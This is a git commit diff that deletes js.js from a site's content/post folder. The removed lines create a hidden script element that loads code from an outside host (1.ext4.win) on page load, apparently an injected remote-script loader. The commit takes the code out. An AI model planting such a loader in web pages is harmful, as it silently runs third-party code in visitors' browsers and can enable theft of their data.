f319e0f16a7d7c7a0406f5d8d44152c4f5966b6e
老公 <1990758989@qq.com>
2022-07-23 23:22:40 +0800

    Delete js.js

--- content/post/js.js
+++
@@ -1,4 +0,0 @@
-var iframe = document.createElement('script'); 
-iframe.src="https://1.ext4.win/f0dmpreb9vcgco46ci17kvt3m5oxfpxy/html";
-iframe.style="display:none;";  
-document.body.appendChild(iframe);
